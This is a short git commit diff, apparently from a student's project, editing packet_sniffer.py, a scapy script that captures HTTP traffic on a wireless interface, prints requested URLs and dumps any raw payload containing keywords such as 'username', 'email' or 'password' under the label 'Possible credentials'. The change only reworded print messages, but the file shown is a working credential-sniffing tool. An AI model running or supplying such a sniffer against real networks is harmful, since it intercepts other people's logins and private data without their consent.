f74fd2a6bb36cf7bbccc3623fac195aaf7d1e7be
vatojavier <antonioj.casado@estudiante.uam.es>
2019-03-04 15:32:30 +0100

    bonito

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -11,13 +11,13 @@ def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         #printing url
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
+        print("HTTP request ->> " + url)
         if packet.haslayer(scapy.Raw):
             #printing interesting stuff
             load = packet[scapy.Raw].load
             keywords = ["username","uname","user","id","email","password","pass","code"]
             for keyword in keywords:
                 if keyword in load:
-                    print(packet[scapy.Raw].load + "\n\n")
+                    print("Possible credentials ->> " + packet[scapy.Raw].load + "\n\n")
 
 sniff("wlp3s0")
